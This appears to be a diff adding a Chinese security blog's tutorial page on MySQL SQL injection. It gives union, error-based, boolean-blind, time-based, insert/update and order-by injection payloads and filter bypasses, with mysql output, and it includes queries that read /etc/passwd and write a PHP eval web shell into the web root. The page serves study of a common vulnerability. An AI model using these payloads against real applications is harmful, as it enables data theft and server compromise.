@@ -1,0 +1,487 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>sql注入 | chuddy&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+    <meta name="keywords" content="chuddy's Blog">
+  
+  <meta name="description" content="sql注入漏洞前言感觉自己以前学的比较粗糙，这一段打算逐一把学过的漏洞再重新学习一边，加深一下印象。 sql注入简介Sql 注入攻击是通过将恶意的 Sql 查询或添加语句插入到应用的输入参数中，再在后台 Sql 服务器上解析执行进行的攻击，它目前黑客对数据库进行攻击的最常用手段之一。 mysql数据库的知识储备123456789101112mysql数据库中的一些全局变量user()  当前用户v">
+<meta name="keywords" content="web漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql注入">
+<meta property="og:url" content="http://yoursite.com/2019/04/22/sql注入/index.html">
+<meta property="og:site_name" content="chuddy&#39;s Blog">
+<meta property="og:description" content="sql注入漏洞前言感觉自己以前学的比较粗糙，这一段打算逐一把学过的漏洞再重新学习一边，加深一下印象。 sql注入简介Sql 注入攻击是通过将恶意的 Sql 查询或添加语句插入到应用的输入参数中，再在后台 Sql 服务器上解析执行进行的攻击，它目前黑客对数据库进行攻击的最常用手段之一。 mysql数据库的知识储备123456789101112mysql数据库中的一些全局变量user()  当前用户v">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-05-08T15:12:22.967Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="sql注入">
+<meta name="twitter:description" content="sql注入漏洞前言感觉自己以前学的比较粗糙，这一段打算逐一把学过的漏洞再重新学习一边，加深一下印象。 sql注入简介Sql 注入攻击是通过将恶意的 Sql 查询或添加语句插入到应用的输入参数中，再在后台 Sql 服务器上解析执行进行的攻击，它目前黑客对数据库进行攻击的最常用手段之一。 mysql数据库的知识储备123456789101112mysql数据库中的一些全局变量user()  当前用户v">
+  
+  
+    <link rel="icon" href="/favicon.ico">
+  
+  <link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+  <link rel="stylesheet" href="/css/style.css">
+  <script src="/js/pace.min.js"></script>
+  
+
+  
+  
+
+</head>
+</html>
+<body>
+  <div id="container">
+      <header id="header">
+    <div id="banner"></div>
+    <div id="header-outer">
+        <div id="header-menu" class="header-menu-pos animated">
+            <div class="header-menu-container">
+                <a href="/" class="left">
+                    <span class="site-title">一个专注 WEB 安全的技术博客</span>
+                </a>
+                <nav id="header-menu-nav" class="right">
+                    
+                    <a href="/">
+                        <i class="fa fa-home"></i>
+                        <span>Home</span>
+                    </a>
+                    
+                    <a href="/archives">
+                        <i class="fa fa-archive"></i>
+                        <span>Archives</span>
+                    </a>
+                    
+                    <a href="/about">
+                        <i class="fa fa-user"></i>
+                        <span>About</span>
+                    </a>
+                    
+                </nav>
+                <a class="mobile-header-menu-button">
+                    <i class="fa fa-bars"></i>
+                </a>
+            </div>
+        </div>
+        <div id="header-row">
+            <div id="logo">
+                <a href="/">
+                    <img src="/images/logo.png" alt="logo">
+                </a>
+            </div>
+            <div class="header-info">
+                <div id="header-title">
+                    
+                    <h2>
+                        一个专注 WEB 安全的技术博客
+                    </h2>
+                    
+                </div>
+                <div id="header-description">
+                    
+                </div>
+            </div>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a title="chuddy" target="_blank" href="//chuddyli.github.io">
+                            <i class="fa fa-home fa-2x"></i></a>
+                    
+                        <a title="Github" target="_blank" href="//github.com/chuddyli">
+                            <i class="fa fa-github fa-2x"></i></a>
+                    
+                </div>
+            </nav>
+        </div>
+    </div>
+</header>
+      <div class="outer">
+        <section id="main" class="body-wrap"><article id="post-sql注入" class="article article-type-post" itemscope="" itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="post-title" itemprop="name">
+      sql注入
+    </h1>
+    <div class="post-title-bar">
+      <ul>
+          
+        <li>
+          <i class="fa fa-calendar"></i>  2019-04-22
+        </li>
+        <li>
+          <i class="fa fa-eye"></i>
+          <span id="busuanzi_value_page_pv"></span>
+        </li>
+      </ul>
+    </div>
+  
+
+          
+      </header>
+    
+    <div class="article-entry post-content" itemprop="articleBody">
+      
+            
+            <h1 id="sql注入漏洞"><a href="#sql注入漏洞" class="headerlink" title="sql注入漏洞"></a>sql注入漏洞</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>感觉自己以前学的比较粗糙，这一段打算逐一把学过的漏洞再重新学习一边，加深一下印象。</p>
+<h2 id="sql注入简介"><a href="#sql注入简介" class="headerlink" title="sql注入简介"></a>sql注入简介</h2><p>Sql 注入攻击是通过将恶意的 Sql 查询或添加语句插入到应用的输入参数中，再在后台 Sql 服务器上解析执行进行的攻击，它目前黑客对数据库进行攻击的最常用手段之一。</p>
+<h2 id="mysql数据库的知识储备"><a href="#mysql数据库的知识储备" class="headerlink" title="mysql数据库的知识储备"></a>mysql数据库的知识储备</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql数据库中的一些全局变量</span><br><span class="line">user()  当前用户</span><br><span class="line">version()  数据库版本</span><br><span class="line">database()  当前数据库名</span><br><span class="line">@@version_compile_os  当前的操作系统</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">数据库中常见的注释符：</span><br><span class="line">1. -- 后面有一个空格</span><br><span class="line">2. /*...*/</span><br><span class="line">3. #</span><br></pre></td></tr></table></figure>
+<p>在MySQL中有一个叫做<code>information_schema</code>的库，它存储着所有表的信息</p>
+<p>虽然里面有这么多的表，常用的不是特别多 <code>schemata</code>、<code>TABLES</code>、<code>COLUMNS</code></p>
+<p><code>schemata</code>表，这个便存储了mysql数据库的所有库名</p>
+<p><code>tables</code>表里面包含了数据库中的所有的表名</p>
+<p><code>COLUMNS</code>表中存储了所有表的字段信息</p>
+<p>一些常用的查找语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">所有用户</span><br><span class="line">select group_concat(user) from mysql.user</span><br><span class="line">用户hash:</span><br><span class="line">select group_concat(password) from mysql.user where user=&apos;root&apos;</span><br><span class="line">所有数据库：</span><br><span class="line">select group_concat(schema_name) from information_schema.schemata</span><br><span class="line">表名：</span><br><span class="line">select group_concat(table_name) from information_schema.tables where table_schema=&apos;库名&apos;</span><br><span class="line">//表中有主码约束，非空约束等完整性约束条件的才能用这个语句查询出来</span><br><span class="line">select group_concat(table_name) from information_schema.table_constraints where table_schema=&apos;库名&apos;</span><br><span class="line">字段名：</span><br><span class="line">select group_concat(column_name) from information_schema.columns where table_name=&apos;表名&apos;</span><br><span class="line">读文件：</span><br><span class="line">select load_file(&apos;/etc/passwd&apos;)</span><br><span class="line">写文件：</span><br><span class="line">select &lt;?php @eval($_POST[&apos;a&apos;]); ?&gt; into outfile &apos;/var/www/html/shell.php&apos;</span><br></pre></td></tr></table></figure>
+<h2 id="常见的sql注入类型"><a href="#常见的sql注入类型" class="headerlink" title="常见的sql注入类型"></a>常见的sql注入类型</h2><h3 id="union注入"><a href="#union注入" class="headerlink" title="union注入"></a>union注入</h3><p>联合注入也是常见一种注入方式，利用条件页面需要有回显位。</p>
+<h4 id="猜字段的长度"><a href="#猜字段的长度" class="headerlink" title="猜字段的长度"></a>猜字段的长度</h4><p>页面有回显的情况下可以通过：<code>order by</code>  来猜测字段的长度</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&apos; order by 3--</span><br></pre></td></tr></table></figure>
+<h4 id="猜字段的位置"><a href="#猜字段的位置" class="headerlink" title="猜字段的位置"></a>猜字段的位置</h4><p>如果已经知道字段的长度为3的话可以通过联合查询来爆出字段的位置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&apos; union select 1,2,3--</span><br></pre></td></tr></table></figure>
+<h4 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,flag,3 from flag</span><br></pre></td></tr></table></figure>
+<h4 id="过滤了逗号的联合注入"><a href="#过滤了逗号的联合注入" class="headerlink" title="过滤了逗号的联合注入"></a>过滤了逗号的联合注入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from user1 where id=-1 union select * from (select version())a join (select database())b join (select database())c;</span><br><span class="line">+--------+------+------+</span><br><span class="line">| id     | name | pass |</span><br><span class="line">+--------+------+------+</span><br><span class="line">| 5.5.53 | test | test |</span><br><span class="line">+--------+------+------+</span><br><span class="line">1 row in set (0.04 sec)</span><br></pre></td></tr></table></figure>
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>mysql数据库的报错注入方法整理，</p>
+<ul>
+<li>floor</li>
+<li>UpdateXml</li>
+<li>ExtractValue</li>
+<li>NAME_CONST</li>
+<li>Error based Double Query Injection</li>
+<li>…</li>
+</ul>
+<h4 id="floor"><a href="#floor" class="headerlink" title="floor"></a>floor</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?id=1 OR (SELECT 8627 FROM(SELECT COUNT(*),CONCAT(0x6368756464797e,(SELECT user()),0x7e636875646479,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">操作：</span><br><span class="line">mysql&gt; select * from user where id=1 OR (SELECT 8627 FROM(SELECT COUNT(*),CONCAT(0x6368756464797e,(SELECT user()),0x7e636875646479,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a);</span><br><span class="line">ERROR 1062 (23000): Duplicate entry &apos;chuddy~root@localhost~chuddy1&apos; for key &apos;group_key&apos;</span><br></pre></td></tr></table></figure>
+<h4 id="ExtractValue-有长度限制-最长32位"><a href="#ExtractValue-有长度限制-最长32位" class="headerlink" title="ExtractValue(有长度限制,最长32位)"></a>ExtractValue(有长度限制,最长32位)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and extractvalue(1, concat(0x7e, (select @@version),0x7e))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; select * from user where 1 and extractvalue(1, concat(0x7e, (select @@version),0x7e));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;~5.5.53~&apos;</span><br></pre></td></tr></table></figure>
+<p>当查询的书库超过32位 可以利用字符串截取函数，多次读取该数据</p>
+<h4 id="UpdateXml-有长度限制-最长32位"><a href="#UpdateXml-有长度限制-最长32位" class="headerlink" title="UpdateXml(有长度限制,最长32位)"></a>UpdateXml(有长度限制,最长32位)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</span><br></pre></td></tr></table></figure>
+<p>利用方式和<code>ExtractValue</code>方式差不多，当查询的书库超过32位 可以利用字符串截取函数，多次读取该数据</p>
+<h4 id="NAME-CONST-适用于低版本，不太好用"><a href="#NAME-CONST-适用于低版本，不太好用" class="headerlink" title="NAME_CONST(适用于低版本，不太好用)"></a>NAME_CONST(适用于低版本，不太好用)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=261 and 1=(select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)</span><br></pre></td></tr></table></figure>
+<h4 id="Error-based-Double-Query-Injection"><a href="#Error-based-Double-Query-Injection" class="headerlink" title="Error based Double Query Injection"></a>Error based Double Query Injection</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 or 1 group by concat_ws(0x7e,version(),floor(rand(0)*2)) having min(0) or 1</span><br></pre></td></tr></table></figure>
+<h4 id="exp-5-5-5以上"><a href="#exp-5-5-5以上" class="headerlink" title="exp(5.5.5以上)"></a>exp(5.5.5以上)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and (select exp(~(select * from(select user())x)))</span><br></pre></td></tr></table></figure>
+<h4 id="polygon"><a href="#polygon" class="headerlink" title="polygon"></a>polygon</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from user where name = &quot;&quot; and polygon(pass);</span><br><span class="line">ERROR 1367 (22007): Illegal non geometric &apos;`test`.`user`.`pass`&apos; value found during parsing</span><br></pre></td></tr></table></figure>
+<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>基本语法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id = 1 and ascii(substr((select database()),1,1))&gt;97--+</span><br></pre></td></tr></table></figure></p>
+<p>由于Mysql4之后对大小写就不敏感，可以使用binary()函数使大小写敏感。</p>
+<h4 id="构造布尔条件的骚姿势"><a href="#构造布尔条件的骚姿势" class="headerlink" title="构造布尔条件的骚姿势"></a>构造布尔条件的骚姿势</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">//正常情况</span><br><span class="line">&apos;or bool#</span><br><span class="line">true&apos;and bool#</span><br><span class="line">    </span><br><span class="line">//不使用空格、注释</span><br><span class="line">&apos;or(bool)=&apos;1</span><br><span class="line">true&apos;and(bool)=&apos;1</span><br><span class="line">    </span><br><span class="line">//不使用or、and、注释</span><br><span class="line">&apos;^!(bool)=&apos;1</span><br><span class="line">&apos;=(bool)=&apos;</span><br><span class="line">&apos;||(bool)=&apos;1</span><br><span class="line">true&apos;%26%26(bool)=&apos;1  //%26就是&amp;</span><br><span class="line">&apos;=if((bool),1,0)=&apos;0</span><br><span class="line">&apos;-(bool)-&apos;</span><br><span class="line">&apos;^(bool)^&apos;</span><br><span class="line">    </span><br><span class="line">//不使用等号、空格、注释</span><br><span class="line">&apos;or(bool)&lt;&gt;&apos;0</span><br><span class="line">&apos;or((bool)in(1))or&apos;0</span><br><span class="line">    </span><br><span class="line">//其他</span><br><span class="line">or (case when (bool) then 1 else 0 end)</span><br></pre></td></tr></table></figure>
+<h4 id="构造逻辑判断"><a href="#构造逻辑判断" class="headerlink" title="构造逻辑判断"></a>构造逻辑判断</h4><p>常见的逻辑判断函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">字符串的截取函数：</span><br><span class="line">left(user(),1)&gt;&apos;c&apos;</span><br><span class="line">right(user(),1)&gt;&apos;c&apos;</span><br><span class="line">substr(user(),1,1)&gt;&apos;c&apos;</span><br><span class="line">mid(user(),1,1)=&apos;c&apos;</span><br><span class="line"></span><br><span class="line">查询字符串的长度:</span><br><span class="line">length(&apos;chuddy&apos;)  </span><br><span class="line"></span><br><span class="line">查询字符的ascii码：</span><br><span class="line">ord(&apos;a&apos;)</span><br><span class="line">ascii(&apos;a&apos;)</span><br><span class="line"></span><br><span class="line">ascii转换字符:</span><br><span class="line">char(97)</span><br><span class="line"></span><br><span class="line">布尔盲注的基本语法：</span><br><span class="line">ascii(substr((查询的sql语句),1,1))&gt;97</span><br></pre></td></tr></table></figure>
+<p>一些绕过方式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">过滤了空格可以一下代替</span><br><span class="line">/*1*/</span><br><span class="line">%20</span><br><span class="line">%a0</span><br><span class="line"></span><br><span class="line">过滤了 = </span><br><span class="line">like</span><br><span class="line">&lt;&gt;</span><br><span class="line">regexp </span><br><span class="line"></span><br><span class="line">过滤了一些关键词</span><br><span class="line">可以大小写绕过</span><br><span class="line">unIon、seLect、</span><br><span class="line"></span><br><span class="line">如果关键词被替换位空白  可以双写绕过</span><br><span class="line">selselectect、 uniunionon</span><br></pre></td></tr></table></figure></p>
+<p>特殊的盲注方法:</p>
+<p>利用order by 盲注<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">----+----------+----------------------------------+</span><br><span class="line">| id | username | password                         |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">|  1 | 2        | 5                                |</span><br><span class="line">|  1 | admin    | 51b7a76d51e70b419f60d3473fb6f900 |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line">    </span><br><span class="line">mysql&gt; select * from admin where username=&apos;&apos; or 1 union select 1,2,&apos;6&apos; order by 3;</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">| id | username | password                         |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">|  1 | admin    | 51b7a76d51e70b419f60d3473fb6f900 |</span><br><span class="line">|  1 | 2        | 6                                |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">2 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure></p>
+<p>过滤很严格的话 可以通过一些其他它方式爆破密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from user1 where name=&quot;user4&quot;  &amp;&amp;   pass&gt;&apos;a1&apos;;</span><br><span class="line">+------+-------+--------+</span><br><span class="line">| id   | name  | pass   |</span><br><span class="line">+------+-------+--------+</span><br><span class="line">|    4 | user4 | a1b2c3 |</span><br><span class="line">+------+-------+--------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from user1 where name=&quot;user4&quot;  &amp;&amp;   pass&gt;&apos;a2&apos;;</span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>跨表查询数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from user1 where id =1 and (select a.pass&lt;&apos;7&apos; from user a limit 1);</span><br><span class="line">+------+-------+------+</span><br><span class="line">| id   | name  | pass |</span><br><span class="line">+------+-------+------+</span><br><span class="line">|    1 | user1 | 123  |</span><br><span class="line">+------+-------+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from user1 where id =1 and (select a.pass&gt;&apos;7&apos; from user a limit 1);</span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure></p>
+<h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h3><p>相交于bool盲注，就是把返回值0和1改为是否延时的标准，一般格式为：<code>if((bool),sleep(5),0)</code>和<code>or (case when (bool) then sleep(5) else 0 end)</code></p>
+<p>延时函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BENCHMARK(100000,MD5(1))</span><br><span class="line"></span><br><span class="line">sleep</span><br></pre></td></tr></table></figure></p>
+<p>BENCHMARK()用于测试函数的性能，参数一为次数，二为要执行的表达式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执行成功。这是一种边信道攻击，在运行过程中占用大量的cpu资源。推荐使用sleep()</p>
+<p>如果着两个函数被ban了可以利用笛卡儿积造成延迟来进行注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; and if(ascii(substr((select database()),%d,1))&lt;%d,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B,information_schema.tables C),1)#</span><br></pre></td></tr></table></figure>
+<h3 id="insert和uodate注入"><a href="#insert和uodate注入" class="headerlink" title="insert和uodate注入"></a>insert和uodate注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">//insert 的报错注入</span><br><span class="line">mysql&gt; insert into user2 values(null,&apos;a&apos; and extractvalue(1, concat(0x7e, (select @@version),0x7e)));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;~5.5.53~&apos;</span><br><span class="line">mysql&gt; insert into user2 values(null,&apos;a&apos; and extractvalue(1, concat(0x7e, (select database()),0x7e)));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;~y1~&apos;</span><br><span class="line"></span><br><span class="line">//update的报错注入</span><br><span class="line">mysql&gt; update user2 set name=&apos;a&apos; where pass=&apos;a&apos; and extractvalue(1, concat(0x7e, (select @@version),0x7e));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;~5.5.53~&apos;</span><br><span class="line">mysql&gt; update user2 set name=&apos;a&apos; where pass=&apos;a&apos; and extractvalue(1, concat(0x7e, (select database()),0x7e));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;~y1~&apos;</span><br><span class="line"></span><br><span class="line">//insert 延时注入 database为y1</span><br><span class="line">mysql&gt; insert into user2(name,pass) values(&apos;a&apos;, mid((select database()),1,1)=&quot;1&quot; or sleep(3));</span><br><span class="line">Query OK, 1 row affected (3.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into user2(name,pass) values(&apos;a&apos;, mid((select database()),1,1)=&quot;y&quot; or sleep(3));</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>如果存在insert或者update,更新后的数据是可见的话,那么利用mysql中字符串在与数字进行运算的时候当作是0进行运算</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select &apos;&apos;+1;</span><br><span class="line">+------+</span><br><span class="line">| &apos;&apos;+1 |</span><br><span class="line">+------+</span><br><span class="line">|    1 |</span><br><span class="line">+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>那么我们可以利用查询的数据转化为10进制,然后进行运算,拿到我们计算的结果,在进行转化回去即可</p>
+<p>insert into 情况下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; insert into user(id,name,pass) values(&apos;7&apos;,&apos;chuddy&apos;,&apos;&apos;+conv(hex(substr(database(),1 + (1-1) * 6,6)),16,10));</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from user where id=7;</span><br><span class="line">+------+--------+------------+</span><br><span class="line">| id   | name   | pass       |</span><br><span class="line">+------+--------+------------+</span><br><span class="line">|    7 | chuddy | 1952805748 |</span><br><span class="line">+------+--------+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select unhex(conv(1952805748,10,16));</span><br><span class="line">+-------------------------------+</span><br><span class="line">| unhex(conv(1952805748,10,16)) |</span><br><span class="line">+-------------------------------+</span><br><span class="line">| test                          |</span><br><span class="line">+-------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></p>
+<p>update 情况下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; update user set pass=&apos;&apos;+conv(hex(substr(user(),1 + (1-1) * 6,6)),16,10) where id=3;</span><br><span class="line">Query OK, 1 row affected (0.11 sec)</span><br><span class="line">Rows matched: 1  Changed: 1  Warnings: 0</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from user where id =3;</span><br><span class="line">+------+-------------+-----------------+</span><br><span class="line">| id   | name        | pass            |</span><br><span class="line">+------+-------------+-----------------+</span><br><span class="line">|    3 | ccccccccccc | 125822936825964 |</span><br><span class="line">+------+-------------+-----------------+</span><br><span class="line">1 row in set (0.04 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select unhex(conv(125822936825964,10,16));</span><br><span class="line">+------------------------------------+</span><br><span class="line">| unhex(conv(125822936825964,10,16)) |</span><br><span class="line">+------------------------------------+</span><br><span class="line">| root@l                             |</span><br><span class="line">+------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></p>
+<h3 id="order-by-注入"><a href="#order-by-注入" class="headerlink" title="order by 注入"></a>order by 注入</h3><h4 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a>报错注入</h4><p>常见的利用方式：</p>
+<p><code>order by 1 and extractvalue(1, concat(0x7e, (select @@version),0x7e))</code></p>
